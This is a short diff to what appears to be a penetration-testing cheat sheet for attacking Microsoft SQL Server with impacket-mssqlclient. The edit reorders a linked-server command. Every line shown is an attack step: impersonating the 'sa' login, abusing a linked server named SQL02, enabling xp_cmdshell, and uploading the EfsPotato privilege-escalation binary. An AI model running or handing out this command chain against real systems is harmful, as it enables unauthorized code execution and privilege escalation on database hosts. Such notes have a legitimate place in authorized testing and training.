@@ -908,9 +908,9 @@ impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET' -windows-auth
 enum_impersonate
 exec_as_login sa
 enum_links
-use_link "SQL02"
 sp_serveroption 'SQL02', 'rpc', 'true'
 sp_serveroption 'SQL02', 'rpc out', 'true'
+use_link "SQL02"
 use_link ..
 enable_xp_cmdshell
 upload /Upload/windows/EfsPotato.exe C:\ProgramData\EfsPotato.exe
